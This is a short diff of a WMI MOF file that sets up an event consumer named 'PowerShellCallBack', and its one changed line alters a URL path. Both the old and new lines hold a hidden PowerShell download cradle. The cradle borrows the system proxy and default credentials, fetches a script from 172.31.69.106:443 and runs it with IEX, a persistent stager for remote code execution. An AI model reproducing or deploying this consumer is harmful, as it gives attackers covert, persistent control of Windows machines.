@@ -15,7 +15,7 @@ instance of CommandLineEventConsumer as $consumer
 {
   Name = "PowerShellCallBack";
   RunInteractively = false;
-  CommandLineTemplate = "powershell.exe -nop -w hidden -c { $q = New-Object Net.WebClient;$q.proxy = [Net.WebRequest]::GetSystemWebProxy();$q.Proxy.Credentials = [Net.CredentialCache]::DefaultCredentials;IEX $q.DownLoadString('http://172.31.69.106:443/');}";
+  CommandLineTemplate = "powershell.exe -nop -w hidden -c { $q = New-Object Net.WebClient;$q.proxy = [Net.WebRequest]::GetSystemWebProxy();$q.Proxy.Credentials = [Net.CredentialCache]::DefaultCredentials;IEX $q.DownLoadString('http://172.31.69.106:443/Dz5Razi9TfJ8s');}";
 };
 
 instance of __FilterToConsumerBinding
